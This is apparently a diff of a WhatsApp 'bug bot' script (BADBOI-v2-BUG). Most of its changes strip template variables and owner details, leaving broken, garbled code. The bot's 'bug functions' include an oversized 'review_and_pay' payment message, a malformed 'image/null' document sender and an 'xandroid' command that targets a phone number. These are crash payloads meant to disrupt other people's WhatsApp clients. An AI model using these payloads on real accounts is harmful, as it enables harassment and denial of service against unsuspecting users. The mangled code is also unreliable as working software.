@@ -145,12 +145,12 @@ isForwarded: true,
 "externalAdReply": {
 "showAdAttribution": true,
 "containsAutoReply": true,
-"title": ` ${global.botname}`,
-"body": `${ownername}`,
+"title": ` `,
+"body": ``,
 "previewType": "PHOTO",
 "thumbnailUrl": ``,
 "thumbnail": fs.readFileSync(`./XeonMedia/thumb.jpg`),
-"sourceUrl": `${link}`}}},
+"sourceUrl": ``}}},
 { quoted: m})
 }
 
@@ -446,7 +446,7 @@ participant: '0@s.whatsapp.net'
 "buttons": [
 {
 "name": "review_and_pay",
-"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
+"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
 }
 ]
 }
@@ -475,8 +475,8 @@ async function XeonyCrashy(dgxeon,chat) {
 XeonBotInc.sendMessage(chat, {
 document: {url: './settings.js'},
 mimetype: `image/null`,
-fileName: `${dgxeon}.${xeontext1}` ,
-caption: `${dgxeon + xeontext1}`,
+fileName: `.` ,
+caption: ``,
 }, {quoted: subscribe_dgxeon })
 }
 //end bug functions
@@ -525,7 +525,7 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         }
         
         if (autobio) {
-            XeonBotInc.updateProfileStatus(`24/7 Online Bot By ${ownername}`).catch(_ => _)
+            XeonBotInc.updateProfileStatus(`24/7 Online Bot By `).catch(_ => _)
         }
         if (m.sender.startsWith('92') && global.anti92 === true) {
             return XeonBotInc.updateBlockStatus(m.sender, 'block')
@@ -533,19 +533,19 @@ await XeonBotInc.sendMessage(from, {text: xeonlod[i], edit: key });
         let list = []
         for (let i of owner) {
 list.push({
-	    	displayName: await XeonBotInc.getName(i),
-	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
-	    })
-	}
-	
-	//chat counter (console log)
+            displayName: await XeonBotInc.getName(i),
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:\nFN:\nitem1.TEL;waid=:\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:\nitem2.X-ABLabel:YouTube\nitem3.URL:\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
+        })
+    }
+    
+    //chat counter (console log)
         if (m.message && m.isGroup) {
             console.log(chalk.cyan(`\n< ================================================== >\n`))
-			console.log(chalk.green(`Group Chat:`))
+            console.log(chalk.green(`Group Chat:`))
             console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
         } else {
             console.log(chalk.cyan(`\n< ================================================== >\n`))
-			console.log(chalk.green(`Private Chat:`))
+            console.log(chalk.green(`Private Chat:`))
             console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
         }
 
@@ -560,25 +560,25 @@ list.push({
         
 for (let BhosdikaXeon of VoiceNoteXeon) {
 if (budy === BhosdikaXeon) {
-let audiobuffy = fs.readFileSync(`./XeonMedia/audio/${BhosdikaXeon}.mp3`)
+let audiobuffy = fs.readFileSync(`./XeonMedia/audio/.mp3`)
 XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 }
 }
 for (let BhosdikaXeon of StickerXeon){
 if (budy === BhosdikaXeon){
-let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/${BhosdikaXeon}.webp`)
+let stickerbuffy = fs.readFileSync(`./XeonMedia/sticker/.webp`)
 XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
 }
 }
 for (let BhosdikaXeon of ImageXeon){
 if (budy === BhosdikaXeon){
-let imagebuffy = fs.readFileSync(`./XeonMedia/image/${BhosdikaXeon}.jpg`)
+let imagebuffy = fs.readFileSync(`./XeonMedia/image/.jpg`)
 XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
 }
 }
 for (let BhosdikaXeon of VideoXeon){
 if (budy === BhosdikaXeon){
-let videobuffy = fs.readFileSync(`./XeonMedia/video/${BhosdikaXeon}.mp4`)
+let videobuffy = fs.readFileSync(`./XeonMedia/video/.mp4`)
 XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
 }
 }
@@ -588,7 +588,7 @@ XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.androi
 }
 for (let BhosdikaXeon of ApkXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./XeonMedia/apk/${BhosdikaXeon}.apk`)
+let buffer = fs.readFileSync(`./XeonMedia/apk/.apk`)
 sendapk(buffer)
 }
 }
@@ -598,7 +598,7 @@ XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {qu
 }
 for (let BhosdikaXeon of ZipXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./XeonMedia/zip/${BhosdikaXeon}.zip`)
+let buffer = fs.readFileSync(`./XeonMedia/zip/.zip`)
 sendzip(buffer)
 }
 }
@@ -608,7 +608,7 @@ haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted
 }
 for (let BhosdikaXeon of DocXeon) {
 if (budy === BhosdikaXeon) {
-let buffer = fs.readFileSync(`./XeonMedia/doc/${BhosdikaXeon}.pdf`)
+let buffer = fs.readFileSync(`./XeonMedia/doc/.pdf`)
 senddocu(buffer)
 }
 }
@@ -621,7 +621,7 @@ senddocu(buffer)
                     let getReason2 = afk.getAfkReason(getId2, _afk)
                     let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                     let heheh2 = ms(getTimee)
-                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
+                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* `)
                 }
             }
             if (afk.checkAfkUser(m.sender, _afk)) {
@@ -631,7 +631,7 @@ senddocu(buffer)
                 let heheh = ms(getTime)
                 _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                 fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
-                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
+                XeonBotInc.sendTextWithMentions(m.chat, `@ have returned from afk`, m)
             }
         }
         switch (command) {
@@ -669,8 +669,8 @@ senddocu(buffer)
                 let data = require("./database/premium.json")
                 let txt = `*------「 LIST PREMIUM 」------*\n\n`
                 for (let i of data) {
-                    txt += `Number : ${i.id}\n`
-                    txt += `Expired : ${i.expired} Second\n`         
+                    txt += `Number : \n`
+                    txt += `Expired :  Second\n`         
                 }                
                 XeonBotInc.sendMessage(m.chat, {
                     text: txt,
@@ -693,16 +693,16 @@ senddocu(buffer)
                         item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                     )
                     console.log(filteredArray.length);
-                    let teks = `Detected ${filteredArray.length} junk files\n\n`
+                    let teks = `Detected  junk files\n\n`
                     if (filteredArray.length == 0) return replygcxeon(teks)
                     filteredArray.map(function(e, i) {
-                        teks += (i + 1) + `. ${e}\n`
+                        teks += (i + 1) + `. \n`
                     })
                     replygcxeon(teks)
                     await sleep(2000)
                     replygcxeon("Delete junk files...")
                     await filteredArray.forEach(function(file) {
-                        fs.unlinkSync(`./session/${file}`)
+                        fs.unlinkSync(`./session/`)
                     });
                     await sleep(2000)
                     replygcxeon("Successfully deleted all the trash in the session folder")
@@ -746,46 +746,46 @@ senddocu(buffer)
                 break
             case 'autoread':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (args.length < 1) return replygcxeon(`Example  on/off`)
                 if (q === 'on') {
                     autoread = true
-                    replygcxeon(`Successfully changed autoread to ${q}`)
+                    replygcxeon(`Successfully changed autoread to `)
                 } else if (q === 'off') {
                     autoread = false
-                    replygcxeon(`Successfully changed autoread to ${q}`)
+                    replygcxeon(`Successfully changed autoread to `)
                 }
                 break
                 case 'autotyping':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (args.length < 1) return replygcxeon(`Example  on/off`)
                 if (q === 'on') {
                     autoTyping = true
-                    replygcxeon(`Successfully changed auto-typing to ${q}`)
+                    replygcxeon(`Successfully changed auto-typing to `)
                 } else if (q === 'off') {
                     autoTyping = false
-                    replygcxeon(`Successfully changed auto-typing to ${q}`)
+                    replygcxeon(`Successfully changed auto-typing to `)
                 }
                 break
                 case 'autorecording':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (args.length < 1) return replygcxeon(`Example  on/off`)
                 if (q === 'on') {
                     autoRecording = true
-                    replygcxeon(`Successfully changed auto-recording to ${q}`)
+                    replygcxeon(`Successfully changed auto-recording to `)
                 } else if (q === 'off') {
                     autoRecording = false
-                    replygcxeon(`Successfully changed auto-recording to ${q}`)
+                    replygcxeon(`Successfully changed auto-recording to `)
                 }
                 break
                 case 'autorecordtyp':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (args.length < 1) return replygcxeon(`Example  on/off`)
                 if (q === 'on') {
                     autorecordtype = true
-                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
+                    replygcxeon(`Successfully changed auto recording and typing to `)
                 } else if (q === 'off') {
                     autorecordtype = false
-                    replygcxeon(`Successfully changed auto recording and typing to ${q}`)
+                    replygcxeon(`Successfully changed auto recording and typing to `)
                 }
                 break
                 case 'autoswview':
@@ -794,27 +794,27 @@ senddocu(buffer)
                if (args.length < 1) return replygcxeon('on/off?')
                if (args[0] === 'on') {
                   autoswview = true
-                  replygcxeon(`${command} is enabled`)
+                  replygcxeon(` is enabled`)
                } else if (args[0] === 'off') {
                   autoswview = false
-                  replygcxeon(`${command} is disabled`)
+                  replygcxeon(` is disabled`)
                }
             }
             break
             case 'autobio':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (args.length < 1) return replygcxeon(`Example  on/off`)
                 if (q == 'on') {
                     autobio = true
-                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
+                    replygcxeon(`Successfully Changed AutoBio To `)
                 } else if (q == 'off') {
                     autobio = false
-                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
+                    replygcxeon(`Successfully Changed AutoBio To `)
                 }
                 break
             case 'mode':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (args.length < 1) return replygcxeon(`Example ${prefix + command} public/self`)
+                if (args.length < 1) return replygcxeon(`Example  public/self`)
                 if (q == 'public') {
                     XeonBotInc.public = true
                     replygcxeon(mess.done)
@@ -825,18 +825,18 @@ senddocu(buffer)
                 break
             case 'setexif':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (!text) return replygcxeon(`Example : ${prefix + command} packname|author`)
+                if (!text) return replygcxeon(`Example :  packname|author`)
                 global.packname = text.split("|")[0]
                 global.author = text.split("|")[1]
-                replygcxeon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
+                replygcxeon(`Exif successfully changed to\n\n• Packname : \n• Author : `)
                 break
             case 'setpp':
             case 'setpp':
             case 'setppbot':
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
-                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
-                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+                if (!quoted) return replygcxeon(`Send/Reply Image With Caption `)
+                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption `)
+                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption `)
                 var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                 if (args[0] == 'full') {
                     var {
@@ -900,21 +900,21 @@ senddocu(buffer)
             case 'bcgc':
             case 'bcgroup': {
                 if (!isCreator) return replygcxeon(mess.owner)
-                if (!text) return replygcxeon(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
+                if (!text) return replygcxeon(`Which text?\n\nExample :  It's holiday tomorrow `)
                 let getGroups = await XeonBotInc.groupFetchAllParticipating()
                 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                 let anu = groups.map(v => v.id)
-                replygcxeon(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
+                replygcxeon(`Send Broadcast To  Group Chat, End Time  second`)
                 for (let i of anu) {
                     await sleep(1500)
-                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
+                    let a = '```' + `\n\n\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                     XeonBotInc.sendMessage(i, {
                         text: a,
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
                                 title: 'Broadcast By Owner',
-                                body: `Sent ${i.length} Group`,
+                                body: `Sent  Group`,
                                 thumbnailUrl: 'https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg',
                                 sourceUrl: global.link,
                                 mediaType: 1,
@@ -923,15 +923,15 @@ senddocu(buffer)
                         }
                     })
                 }
-                replygcxeon(`Successfully Sent Broadcast To ${anu.length} Group`)
+                replygcxeon(`Successfully Sent Broadcast To  Group`)
             }
             break
             case 'getcase':
                 if (!isCreator) return replygcxeon(mess.owner)
                 const getCase = (cases) => {
-                    return "case" + `'${cases}'` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
+                    return "case" + `''` + fs.readFileSync("XeonBug3.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                 }
-                replygcxeon(`${getCase(q)}`)
+                replygcxeon(``)
                 break
             case 'delete':
             case 'del': {
@@ -970,7 +970,7 @@ senddocu(buffer)
                 } else {
                     return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                 }
-                replygcxeon(`Close time ${q} starting from now`)
+                replygcxeon(`Close time  starting from now`)
                 setTimeout(() => {
                     var nomor = m.participant
                     const close = `*Closed* group closed by admin\nnow only admin can send messages`
@@ -993,7 +993,7 @@ senddocu(buffer)
                 } else {
                     return replygcxeon('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                 }
-                replygcxeon(`Open time ${q} starting from now`)
+                replygcxeon(`Open time  starting from now`)
                 setTimeout(() => {
                     var nomor = m.participant
                     const open = `*Opened* The group is opened by admin\nNow members can send messages`
@@ -1051,9 +1051,9 @@ senddocu(buffer)
                 if (!m.isGroup) return replygcxeon(mess.group)
                 if (!isAdmins) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
-                if (!quoted) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
-                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
-                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
+                if (!quoted) return replygcxeon(`Send/Reply Image With Caption `)
+                if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption `)
+                if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption `)
                 var medis = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                 if (args[0] == 'full') {
                     var {
@@ -1090,9 +1090,9 @@ senddocu(buffer)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 let teks = `*👥 Tag All*
  
-                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
+                 🗞️ *Message :  'blank'*\n\n`
                 for (let mem of participants) {
-                    teks += `• @${mem.id.split('@')[0]}\n`
+                    teks += `• @\n`
                 }
                 XeonBotInc.sendMessage(m.chat, {
                     text: teks,
@@ -1116,7 +1116,7 @@ senddocu(buffer)
                 if (!m.isGroup) return replygcxeon(mess.group)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 if (!isAdmins) return replygcxeon(mess.admin)
-                if (!m.quoted) return replygcxeon(`Reply messages with captions ${prefix + command}`)
+                if (!m.quoted) return replygcxeon(`Reply messages with captions `)
                 XeonBotInc.sendMessage(m.chat, {
                     forward: m.quoted.fakeObj,
                     mentions: participants.map(a => a.id)
@@ -1132,7 +1132,7 @@ senddocu(buffer)
                 } else if (args[0] === 'open') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcxeon(`Success In Opening The Group 🕊️`)).catch((err) => replygcxeon(json(err)))
                 } else {
-                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
+                    replygcxeon(`Mode \n\n\nType open/close`)
                 }
                 break
             case 'editinfo':
@@ -1144,7 +1144,7 @@ senddocu(buffer)
                 } else if (args[0] === 'close') {
                     await XeonBotInc.groupSettingUpdate(m.chat, 'locked').then((res) => replygcxeon(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replygcxeon(json(err)))
                 } else {
-                    replygcxeon(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
+                    replygcxeon(`Mode \n\n\nType on/off`)
                 }
                 break
             case 'linkgroup':
@@ -1155,7 +1155,7 @@ senddocu(buffer)
                 if (!isAdmins && !isGroupOwner && !isCreator) return replygcxeon(mess.admin)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 let response = await XeonBotInc.groupInviteCode(m.chat)
-                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
+                XeonBotInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* \n👤 *Group Owner :*  'Not known'\n🌱 *ID :* \n🔗 *Chat Link :* https://chat.whatsapp.com/\n👥 *Member :* \n`, m, {
                     detectLink: true
                 })
                 break
@@ -1166,7 +1166,7 @@ senddocu(buffer)
                 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
                 await XeonBotInc.groupRevokeInvite(m.chat)
                     .then(res => {
-                        replygcxeon(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
+                        replygcxeon(`Successful Reset, Group Invite Link `)
                     }).catch((err) => replygcxeon(json(err)))
                 break
                 case 'p':
@@ -1203,31 +1203,30 @@ senddocu(buffer)
                 neww = performance.now()
                 oldd = performance.now()
                 respon = `
-		TESTING BADBOI-v2-BUG SPEED 
-  ${readmore}
-Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
+        TESTING BADBOI-v2-BUG SPEED 
+  
+Response Speed  _Second_ \n  _miliseconds_\n\nRuntime : 
 
 💻 Info Server
-RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+RAM:  / 
 
 BADBOI-v2-BUG-CONNECTED SUCCESSFULLY 
 
-  ${readmore}
+  
 _NodeJS Memory Usaage_
-${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
+: `).join('\n')}
 
-${cpus[0] ? `_Total CPU Usage_
-${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
-_CPU Core(s) Usage (${cpus.length} Core CPU)_
-${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
+ ( MHZ)\n: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
+_CPU Core(s) Usage ( Core CPU)_
+.  ( MHZ)\n: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
 `.trim()
                 await XeonBotInc.sendMessage(m.chat, {
                     text: respon,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `${botname}`,
-                            body: `${latensi.toFixed(4)} Second`,
+                            title: ``,
+                            body: ` Second`,
                             thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
@@ -1242,14 +1241,14 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             case 'buypremium':
             case 'buyprem':
             case 'premium': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
+                let teks = `Hi 👋\nWant to Buy Premium? Just chat with the owner😉`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `${botname}`,
-                            body: `${ownername}`,
+                            title: ``,
+                            body: ``,
                             thumbnailUrl: 'https://i.imgur.com/I5BujDY.jpeg',
                             sourceUrl: global.link,
                             mediaType: 1,
@@ -1263,14 +1262,14 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
             break
             case 'runtime':
                 let runtimetext = `𝙱𝙰𝙳-𝙱𝙾𝙸 𝚅2 𝙼𝙳 𝙷𝙰𝚂 𝙱𝙴𝙴𝙽 𝙾𝙽𝙻𝙸𝙽𝙴. 𝙲𝙻𝙸𝙲𝙺 𝚃𝙾 𝙲𝙷𝙴𝙲𝙺 𝙼𝚈 𝚁𝚄𝙽𝚃𝙸𝙼𝙴⬇️👇
-		${readmore}
-		BAD-BOI v2 Have Been Running For ${runtime(process.uptime())}`
+        
+        BAD-BOI v2 Have Been Running For `
                 XeonBotInc.sendMessage(m.chat, {
                     text: runtimetext,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `${botname}`,
+                            title: ``,
                             body: `FORGET DONATE`,
                             thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
@@ -1288,7 +1287,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 XeonBotInc.sendMessage(m.chat, {
                     text: `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 
-•  𝑯𝒊  ${pushname}
+•  𝑯𝒊  
 
 •  𝑰 𝒂𝒎 𝙱𝙰𝙳-𝙱𝙾𝙸 𝚅2 𝙱𝚄𝙶.
 
@@ -1305,15 +1304,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 𝐂𝐑𝐄𝐃𝐈𝐓𝐒
 
 𝐁𝐀𝐃𝐁𝐎𝐈-𝐯𝟐
-𝐋𝐎𝐑𝐃 𝐄𝐌𝐏𝐄𝐑𝐎𝐑
+𝐋𝐎𝐑𝐃 NO N A M E
 𝐋𝐎𝐑𝐃 𝐓𝐊𝐌
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`,
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `${botname}`,
-                            body: `SCRIPT OF ${botname} is on kiddes scripts WhatsApp channel `,
+                            title: ``,
+                            body: `SCRIPT OF  is on kiddes scripts WhatsApp channel `,
                             thumbnailUrl: 'https://i.ibb.co/Dby2D94/x.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
@@ -1326,7 +1325,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 break
             case 'donate':
             case 'donasi':
-                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
+                let textnate = `Hello Brother \n\nNo matter how much you donate is very valuable for us`
                 XeonBotInc.sendMessage(m.chat, {
                     text: 'Paypal: https://www.paypal.me/josephxeon13\n\n' + textnate
                 }, {
@@ -1336,15 +1335,15 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
 case 'owner': {
 const repf = await XeonBotInc.sendMessage(from, { 
 contacts: { 
-displayName: `${list.length} Contact`, 
+displayName: ` Contact`, 
 contacts: list }, mentions: [sender] }, { quoted: m })
-XeonBotInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
+XeonBotInc.sendMessage(from, { text : `Hi @, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
 }
 break
             case 'sticker':
             case 'stiker':
             case 's': {
-                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption ${prefix + command}`)
+                if (!quoted) return replygcxeon(`Reply to Video/Image With Caption `)
                 if (/image/.test(mime)) {
                     let media = await quoted.download()
                     let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, {
@@ -1361,12 +1360,12 @@ break
                     })
                     await fs.unlinkSync(encmedia)
                 } else {
-                    return replygcxeon(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
+                    return replygcxeon(`Send Images/Videos With Captions \nVideo Duration 1-9 Seconds`)
                 }
             }
             break
             case 'smeme': {
-                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
+                let respond = `Send/Reply image/sticker with caption  text1|text2`
                 if (!/image/.test(mime)) return replygcxeon(respond)
                 if (!text) return replygcxeon(respond)
                 replygcxeon(mess.wait)
@@ -2113,11 +2112,11 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349066528353") {
+  if (cleanedNumber == "2348140825959") {
     return;
   }
   if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp");
